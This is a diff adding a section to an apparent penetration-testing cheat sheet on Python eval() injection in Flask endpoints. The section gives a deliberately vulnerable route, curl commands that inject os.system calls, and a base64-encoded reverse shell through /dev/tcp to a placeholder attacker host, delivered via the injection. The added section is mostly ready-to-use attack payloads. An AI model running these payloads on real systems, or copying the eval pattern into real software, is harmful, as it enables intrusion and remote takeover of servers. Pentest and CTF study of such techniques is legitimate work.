@@ -284,6 +284,41 @@ def template(first, last, sender, ts, dob, gender):
 <sender_app>{__import__('os').system('id')}</sender_app>
 ```
 
+### Direct Python eval() on form input
+
+Flask/Werkzeug helper APIs may expose small endpoints that look like token generators or validators. If valid math is returned and invalid names throw `500`, test whether the parameter is passed directly to `eval()`.
+
+**Vulnerable code pattern:**
+
+```python
+@app.route('/verify', methods=['GET', 'POST'])
+def verify():
+    if request.method == 'GET':
+        return "{'code'}"
+    code = request.form['code']
+    result = eval(code)
+    return str(result)
+```
+
+**Quick checks:**
+
+```bash
+curl -X POST http://TARGET:50000/verify -d 'code=5*5'
+# 25
+
+curl -X POST http://TARGET:50000/verify -d 'code=__import__("os").system("sleep 5")'
+# hangs for ~5 seconds and returns the command exit code
+```
+
+**Reverse shell with encoding to avoid special-character issues:**
+
+```bash
+echo 'sh -i >& /dev/tcp/ATTACKER_IP/80 0>&1' | base64 -w0
+
+curl -X POST http://TARGET:50000/verify \
+  -d 'code=__import__("os").system("echo BASE64_PAYLOAD | base64 -d | sh")'
+```
+
 ---
 
 ## Other Engines Quick Reference
